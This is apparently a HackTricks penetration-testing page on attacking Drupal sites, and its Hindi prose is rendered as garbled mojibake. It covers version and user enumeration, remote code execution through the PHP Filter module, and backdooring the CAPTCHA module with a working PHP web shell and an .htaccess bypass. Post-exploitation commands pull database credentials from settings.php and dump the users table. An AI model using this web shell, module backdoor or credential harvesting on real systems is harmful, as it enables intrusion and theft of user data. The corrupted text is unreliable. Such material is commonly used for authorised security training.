# Drupal

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

## рдЦреЛрдЬ

* **рдореЗрдЯрд╛** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupal **рдЕрдкрдиреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдиреЛрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдВрдбреЗрдХреНрд╕ рдХрд░рддрд╛ рд╣реИ**ред рдПрдХ рдиреЛрдб **рдХреБрдЫ рднреА рд░рдЦ рд╕рдХрддрд╛ рд╣реИ** рдЬреИрд╕реЗ рдХрд┐ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ, рдкреЛрд▓, рд▓реЗрдЦ, рдЖрджрд┐ред рдкреЗрдЬ URIs рдЖрдорддреМрд░ рдкрд░ `/node/<nodeid>` рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред
```bash
curl drupal-site.com/node/1
```
## рдкрд░рд┐рдЧрдгрдирд╛

Drupal рдореВрд▓ рд░реВрдк рд╕реЗ **рддреАрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:

1. **`Administrator`**: рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИред
2. **`Authenticated User`**: рдпреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓реЗрдЦ рдЬреЛрдбрд╝рдиреЗ рдФрд░ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реЗ рдХрд╛рд░реНрдп рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
3. **`Anonymous`**: рд╕рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЖрдЧрдВрддреБрдХреЛрдВ рдХреЛ рдЕрдирд╛рдо рдХреЗ рд░реВрдк рдореЗрдВ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдореВрд▓ рд░реВрдк рд╕реЗ, рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдкреЛрд╕реНрдЯ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### рд╕рдВрд╕реНрдХрд░рдг

* `/CHANGELOG.txt` рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupal рдХреА рдирдИ рд╕реНрдерд╛рдкрдирд╛рдПрдБ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `CHANGELOG.txt` рдФрд░ `README.txt` рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдБрдЪ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддреА рд╣реИрдВред
{% endhint %}

### рдпреВрдЬрд░рдиреЗрдо рдЕрдиреБрдорд╛рди

#### рд░рдЬрд┐рд╕реНрдЯрд░

_/user/register_ рдореЗрдВ рдмрд╕ рдПрдХ рдпреВрдЬрд░рдиреЗрдо рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдФрд░ рдЕрдЧрд░ рдирд╛рдо рдкрд╣рд▓реЗ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдЗрд╕рдХреА рд╕реВрдЪрдирд╛ рджреА рдЬрд╛рдПрдЧреА:

![](<../../.gitbook/assets/image (254).png>)

#### рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз

рдЕрдЧрд░ рдЖрдк рдореМрдЬреВрджрд╛ рдпреВрдЬрд░рдиреЗрдо рдХреЗ рд▓рд┐рдП рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (255).png>)

рдЕрдЧрд░ рдЖрдк рдЧреИрд░-рдореМрдЬреВрджрд╛ рдпреВрдЬрд░рдиреЗрдо рдХреЗ рд▓рд┐рдП рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (256).png>)

### рдпреВрдЬрд░реНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

_/user/\<number>_ рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рдЖрдк рдореМрдЬреВрджрд╛ рдпреВрдЬрд░реНрд╕ рдХреА рд╕рдВрдЦреНрдпрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 2 рд╣реИ рдХреНрдпреЛрдВрдХрд┐ _/users/3_ рдПрдХ рдирд╣реАрдВ рдорд┐рд▓рд╛ рддреНрд░реБрдЯрд┐ рджреЗрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### рдЫрд┐рдкреЗ рд╣реБрдП рдкреЗрдЬ

**`/node/$` рдХреЛ Fuzz рдХрд░реЗрдВ рдЬрд╣рд╛рдБ `$` рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 1 рд╕реЗ 500 рддрдХ)ред\
рдЖрдк **рдЫрд┐рдкреЗ рд╣реБрдП рдкреЗрдЬ** (рдЯреЗрд╕реНрдЯ, рдбреЗрд╡) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╕рд░реНрдЪ рдЗрдВрдЬрдиреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрджрд░реНрднрд┐рдд рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

#### рд╕реНрдерд╛рдкрд┐рдд рдореЙрдбреНрдпреВрд▓ рдХреА рдЬрд╛рдирдХрд╛рд░реА
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### PHP Filter Module рдХреЗ рд╕рд╛рде

{% hint style="warning" %}
Drupal рдХреЗ рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ **(рд╕рдВрд╕реНрдХрд░рдг 8 рд╕реЗ рдкрд╣рд▓реЗ)**, рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдирд╛ рдФрд░ **`PHP filter` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛** рд╕рдВрднрд╡ рдерд╛, рдЬреЛ "PHP рдХреЛрдб/рд╕реНрдирд┐рдкреЗрдЯреНрд╕ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред"
{% endhint %}

рдЖрдкрдХреЛ **plugin php рдХрд╛ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ** (рдЗрд╕реЗ _/modules/php_ рдкрд░ рдЬрд╛рдХрд░ рдЬрд╛рдВрдЪреЗрдВ рдФрд░ рдпрджрд┐ рдпрд╣ **403** рд▓реМрдЯрд╛рддрд╛ рд╣реИ, рддреЛ, **рдореМрдЬреВрдж рд╣реИ**, рдпрджрд┐ **рдирд╣реАрдВ рдорд┐рд▓рд╛**, рддреЛ **plugin php рдЗрдВрд╕реНрдЯреЙрд▓ рдирд╣реАрдВ рд╣реИ**)

_Modules_ рдкрд░ рдЬрд╛рдПрдВ -> (**рдЬрд╛рдВрдЪреЗрдВ**) _PHP Filter_ -> _Save configuration_

![](<../../.gitbook/assets/image (247) (1).png>)

рдлрд┐рд░ _Add content_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> _Basic Page_ рдпрд╛ _Article_ рдЪреБрдиреЗрдВ -> _php shellcode рдХреЛ body рдореЗрдВ рд▓рд┐рдЦреЗрдВ_ -> _Text format_ рдореЗрдВ _PHP code_ рдЪреБрдиреЗрдВ -> _Preview_ рдЪреБрдиреЗрдВ

![](<../../.gitbook/assets/image (253) (1).png>)

рдЕрдВрдд рдореЗрдВ рдмрд╕ рдирдП рдмрдирд╛рдП рдЧрдП рдиреЛрдб рдХреЛ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ:
```bash
curl http://drupal-site.local/node/3
```
### PHP Filter Module рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ

рд╕рдВрд╕реНрдХрд░рдг **8 рдХреЗ рдмрд╛рдж рд╕реЗ,** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрд╡рдпрдВ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХрд╛ рд╕рдмрд╕реЗ рд╣рд╛рд▓ рдХрд╛ рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж **`Administration`** > **`Reports`** > **`Available updates`** рдкрд░ рдЬрд╛рдПрдВред
3. **`Browse`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдлрд┐рд░ рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ рдлрд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо **`Content`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдирдпрд╛ рдмреЗрд╕рд┐рдХ рдкреЗрдЬ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдХреЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реЗ, рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`Text format` рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ `PHP code` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ**ред

### Backdoored Module

рдПрдХ backdoored рдореЙрдбреНрдпреВрд▓ **рдореМрдЬреВрджрд╛ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдПрдХ рд╢реЗрд▓ рдЬреЛрдбрд╝рдХрд░** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдореЙрдбреНрдпреВрд▓реНрд╕ drupal.org рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЪрд▓рд┐рдП [CAPTCHA](https://www.drupal.org/project/captcha) рдЬреИрд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдЪреБрдирддреЗ рд╣реИрдВред рдиреАрдЪреЗ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВ рдФрд░ tar.gz [archive](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) рдХреЗ рд▓рд┐рдВрдХ рдХреЛ рдХреЙрдкреА рдХрд░реЗрдВред

* рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЗрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдХрд╛рд▓реЗрдВред
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* **PHP рд╡реЗрдм рд╢реЗрд▓** рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реЛ:
```php
<?php
system($_GET["cmd"]);
?>
```
* рдЕрдЧрд▓рд╛, рд╣рдореЗрдВ рдЦреБрдж рдХреЛ рдлреЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **`.htaccess`** рдлрд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдпрд╣ рдЬрд░реВрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Drupal рд╕реАрдзреЗ **`/modules`** рдлреЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ рдХреЛ рдордирд╛ рдХрд░рддрд╛ рд╣реИред
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* рдКрдкрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди / рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдирд┐рдпрдо рд▓рд╛рдЧреВ рдХрд░реЗрдЧрд╛ рдЬрдм рд╣рдо /modules рдореЗрдВ рдХрд┐рд╕реА рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВред рдЗрди рджреЛрдиреЛрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ captcha рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдПрдХ рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдПрдВред
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* рдорд╛рди рд▓реАрдЬрд┐рдП рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХрд╛ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдБрдЪ** рд╣реИ, **`рдкреНрд░рдмрдВрдзрди`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рд╕рд╛рдЗрдбрдмрд╛рд░ рдкрд░ **`рд╡рд┐рд╕реНрддрд╛рд░`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЕрдЧрд▓рд╛, **`+ рдирдпрд╛ рдореЙрдбреНрдпреВрд▓ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ`** рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рд╣рдореЗрдВ рд╕реНрдерд╛рдкрдирд╛ рдкреГрд╖реНрда рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ рдХрд┐ `http://drupal-site.local/admin/modules/install` рдмреИрдХрдбреЛрд░реНрдб рдХреИрдкреНрдЪрд╛ рдЖрд░реНрдХрд╛рдЗрд╡ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ рдФрд░ **`рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рд╕реНрдерд╛рдкрдирд╛ рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, **`/modules/captcha/shell.php`** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрджреЗрд╢реЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди

### settings.php рдкрдврд╝реЗрдВ
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### рдбреАрдмреА рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдирд┐рдХрд╛рд▓рдирд╛
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## рд╕рдВрджрд░реНрдн

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ **рдореБрдЭреЗ рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
